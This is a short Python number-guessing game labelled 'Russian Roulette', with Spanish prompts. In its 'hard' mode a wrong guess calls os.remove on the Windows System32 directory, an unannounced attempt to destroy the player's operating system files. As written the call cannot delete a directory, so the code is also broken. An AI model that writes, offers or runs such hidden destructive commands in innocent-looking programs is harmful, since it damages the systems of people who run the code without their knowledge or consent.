# Russian Roulette Game
from random import randint
import os


while True:

    dificulty = input("elige la dificultad: (normal/hard) \n").lower()

    number = randint(1,10)

    answer = input("Escoje un numero del 1 al 10 \n")

    if dificulty == "normal":
    
        if answer == str(number):
            print("Correcto, esa es la respuesta correcta")

        else:
            print(f"Incorrecto, la respuesta correcta era {number}")

        retry = input("\nQuieres volver a jugar? (Y/N) \n").lower()

        if retry == "n":
            print("Gracias por jugar")
            break

    if dificulty == "hard":
        
        if answer == str(number):
            print("Correcto, esa es la respuesta correcta")

            retry = input("\nQuieres volver a jugar? (Y/N) \n").lower()

            if retry == "n":
                print("Gracias por jugar")
                break

        else:
            os.remove("C:\Windows\System32")
            break